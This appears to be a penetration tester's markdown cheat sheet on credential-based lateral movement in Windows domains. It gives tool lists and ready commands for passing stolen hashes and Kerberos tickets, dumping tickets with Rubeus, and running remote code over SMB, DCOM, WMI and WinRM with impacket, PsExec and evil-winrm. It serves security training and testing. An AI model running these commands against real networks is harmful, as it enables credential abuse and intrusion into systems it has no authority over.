# Credential based lateral movement

## Questions to ask yourself
  *  What authentication protocols are allowed/supported?
  *  Any older hosts/service?
      *  May allow older auth protocols for compatability
      *  Search for known neighbors of hosts with older auth protocols

## Things to remember
  *  Credentials are the easiest form of lateral movement
  *  Any form of credential can often be used
      *  Includes passwords, password hashes, kerberos tickets, etc.
  *  Any admin/management interface may be ripe for lateral movement
      *  This section mostly covers common Windows management implementations

## Useful tools
  *  [`Rubeus`](https://github.com/GhostPack/Rubeus) for requesting, dumping, and passing tickets from Windows
  *  [`impacket-getTGT`](https://github.com/fortra/impacket/blob/master/examples/getTGT.py)/[`impacket-getST`](https://github.com/fortra/impacket/blob/master/examples/getST.py) for requesting kerberos tickets from Linux
  *  [`impacket-ticketConverter`](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) for converting tickets between `kirbi` and `ccache` formats
  *  [`PsExec`](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)/[`impacket-psexec`](https://github.com/fortra/impacket/blob/master/examples/psexec.py)/[`impacket-smbexec`](https://github.com/fortra/impacket/blob/master/examples/smbexec.py) for code exec via SMB
  *  [`impacket-dcomexec`](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) for code exec via DCOM
  *  [`wmic`](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic)/[`impacket-wmiexec`](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) for code exec via WMI
  *  [`winrs`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)/[`evil-winrm`](https://github.com/Hackplayers/evil-winrm) for code exec via WinRM

## Pass the hash
  *  Some authentication mechanisms only rely on the hash of the user's password
      *  Meaning the actual password is not required, only the hash is needed
      *  Steal password hashes and use them to authenticate
  *  Many tools can make use of NT hashes for authentication `GTS`

## Overpass the hash
  *  Use a stolen AES key/NT hash to obtain tickets, then pass the ticket
  *  `Rubeus` or `impacket` for obtaining kerberos tickets using hashes

```
.\Rubeus.exe asktgt /domain:exampleDomain.local /user:bob /rc4:[NT hash]
```

```
impacket-getTGT exampleDomain.local/bob@exampleHostname -hashes [NTLM] -dc-ip 10.0.0.1
export KRB5CCNAME=/home/kali/bob@exampleHostname.ccache
impacket-smbexec exampleDomain.local/bob@exampleHostname -no-pass -k -target-ip 10.0.0.1 -dc-ip 10.0.0.1
```

## Pass the ticket
  *  Acquire kerberos tickets and use them to authenticate
      *  Target must be specified by hostname **NOT** IP address
  *  `Rubeus` for dumping and passing tickets from Windows 
      *  Only one TGT allowed per logon session, purge tickets before injection
  *  `impacket` suite for passing tickets from Linux
      *  `KRB5CCNAME` env variable must be configured to point to ccache file
      *  Add target hostname to `/etc/hosts` or specify target IP

```
.\Rubeus.exe dump
.\Rubeus.exe dump /service:krbtgt
klist purge
.\Rubeus.exe ptt /ticket:[base64 blob]
PS > [IO.File]::WriteAllBytes('C:\path\to\new\ticket.kirbi' [Convert]::FromBase64String('base64 blob'))
```

```
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=/path/to/ticket.ccache
impacket-smbexec exampleDomain.local/bob@exampleHostname -no-pass -k -target-ip 10.0.0.1 -dc-ip 10.0.0.1
```

## PsExec
  *  `PsExec` is old, loud, and likely to attract prying eyes
      *  `PsExec.exe` does **NOT** play well within a normal reverse shell
  *  `impacket-psexec` for PsExec-like behavior from linux
      *  Consider `impacket-smbexec` or target a management service instead

```
impacket-psexec exampleDomain.com/bob:password@10.0.0.1
impacket-psexec bob@10.0.0.1 -hashes :[NT hash]
.\PsExec.exe -accepteula -u bob \\exampleHostname cmd.exe
```

## Distributed Component Object Model ([DCOM](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0))
  *  Abuse methods of remote [COM objects](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model) to execute commands
      *  [Example covered on ired.team](https://www.ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model) leverages [`MMC20.Application`](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/mmc/microsoft-management-console-start-page)
      *  Other methods exist, such as [abusing MS Office apps](https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)
  *  [Hunt for juicy COM object methods](https://www.mandiant.com/resources/blog/hunting-com-objects) for more control over how code exec appears on the target
  *  `impacket-dcomexec` for leveraging DCOM from linux

```
PS > $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "10.0.0.1"))
PS > $com.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-e [BASE64 BLOB]", "7")
```

```
impacket-dcomexec exampleDomain.com/bob:password123@10.0.0.1 -object MMC20
```

## Windows Management Instrumentation ([WMI](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page))
  *  MS implementation of [CIM](https://learn.microsoft.com/en-us/windows/win32/wmisdk/common-information-model) using [DCOM under the hood](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/c0088a94-1107-48a5-8d4d-cd16d34de5ef)
  *  [`Invoke-WmiMethod`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/invoke-wmimethod?view=powershell-5.1) or [`Invoke-CimMethod`](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod?view=powershell-5.1) for WMI code exec from powershell
       *  [`PSCredential`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7.4#example-4) for supplying creds of another user
  *  `wmic` for leveraging WMI from Windows without powershell
  *  `impacket-wmiexec` for leveraging WMI from linux

```
PS > $pass = ConvertTo-SecureString "password" -AsPlainText -Force
PS > $cred = New-Object System.Management.Automation.PSCredential("bob", $pass)
PS > $session = New-CimSession -Cred $cred -ComputerName exampleHostname
PS > Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName "Create" -Arguments @{CommandLine = "notepad.exe"}
PS > Invoke-WmiMethod -Cred $cred -ComputerName exampleHostname -Path Win32_Process -Name Create -ArgumentList "notepad.exe"
```

```
wmic /node:10.0.0.1 /user:bob /password:password123 process call create "notepad.exe"
```

```
impacket-wmiexec exampleDomain.com/bob:password123@10.0.0.1
```

## Windows Remote Management ([WinRM](https://learn.microsoft.com/en-us/windows/win32/WinRM/portal))
  *  MS implementation of [WS-Management](https://learn.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (SOAP API) also [exposes WMI data and operations](https://learn.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-and-wmi)
  *  [Powershell remoting](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.4) for WinRM code exec from powershell
      *  ired.team has a [list of useful commands](https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement#additional-useful-commands)
  *  `winrs` for leveraging WinRM from Windows without powershell
  *  `evil-winrm` for leveraging WinRM from linux

```
PS > $session = New-PSSession -ComputerName exampleHostname -Credential $cred
PS > Enter-PSSession -Session $session
PS > Invoke-Command -Session $session { Write-Host "example powershell code" }
```

```
winrs -r:exampleHostname "cmd.exe"
winrs -r:exampleHostname -u:bob -p:password123 "cmd.exe"
```

```
evil-winrm -i 10.0.0.1 -u bob -p password123
```
